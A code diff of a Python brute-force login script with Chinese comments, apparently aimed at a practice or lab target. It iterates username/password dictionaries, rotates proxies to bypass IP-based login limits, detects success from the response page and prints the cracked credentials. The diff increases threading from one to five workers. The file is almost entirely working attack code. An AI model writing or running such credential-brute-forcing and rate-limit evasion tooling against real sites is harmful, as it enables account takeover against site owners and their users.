@@ -50,66 +50,43 @@ def login_bypass_ip_limit():
 
                 elif soup.find('a', attrs={'id':'backdoor'}):
                     # 用户名密码正确，成功登录
-                    print("登录成功")
                     success_queue.put(payload)
                     success_username.append(username)
-                    stop_brute()
+                    print('【爆破成功，用户名:{},密码:{}】'.format(username,password))
+                    # stop_brute()
                     return True
 
                 elif soup.find('span',text='用户名或密码错误！'):
-                    print("用户名或密码错误")
+                    # print("用户名或密码错误")
                     return False
+                else:
+                    pass
             else:
-                # print("连接异常")
-                pass
+                print("连接异常")
+        except Exception as e:
+            print(e)
+        # except requests.exceptions.ConnectionError:
+        #     print("代理不可用,更换代理")
+        #     CUR_PROXY = utils.get_proxy()
+        #     print("当前使用代理:{}".format(CUR_PROXY))
+        # except requests.exceptions.Timeout:
+        #     print("代理连接速度过慢，更换代理！")
+        #     CUR_PROXY = utils.get_proxy()
+        #     print("当前使用代理:{}".format(CUR_PROXY))
 
-        except requests.exceptions.ConnectionError:
-            print("代理不可用,更换代理")
-            CUR_PROXY = utils.get_proxy()
-            print("当前使用代理:{}".format(CUR_PROXY))
-        except requests.exceptions.Timeout:
-            print("代理连接速度过慢，更换代理！")
-            CUR_PROXY = utils.get_proxy()
-            print("当前使用代理:{}".format(CUR_PROXY))
-
-        except:
-            # print('未知情况')
-            pass
-
-def get_dict(dict_user, dict_pass):
-    """
-    生成字典队列
-    :return:
-    """
-    with open("dict/{}".format(dict_user)) as f:
-        username = [line.strip() for line in f.readlines()]
-
-    with open('dict/{}'.format(dict_pass)) as f:
-        passwords = [line.strip() for line in f.readlines()]
-
-    count = 0
-    for u in username:
-        for p in passwords:
-            count += 1
-            pair = (u, p)
-            dict_queue.put(pair)
-    print("字典生成完成，长度 {}".format(count))
+        # except:
+        #     # print('未知情况')
+        #     pass
 
 
-def get_parse() -> dict:
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--username", "-u", help="用户名字典")
-    parser.add_argument("--password", "-p", help="密码字典")
-    dic = vars(parser.parse_args())
-    return dic
 
 
 if __name__ == "__main__":
     # 开启代理池
 
-    args = get_parse()
+    args = utils.get_parse()
     dict_username = args.get('dict_username', "username.txt")
     dict_password = args.get('dict_password', "password.txt")
-    get_dict(dict_username, dict_password)
+    utils.get_dict(dict_username, dict_password)
 
-    bruteforce(login_bypass_ip_limit, thread_num=1)
+    bruteforce(login_bypass_ip_limit, thread_num=5)
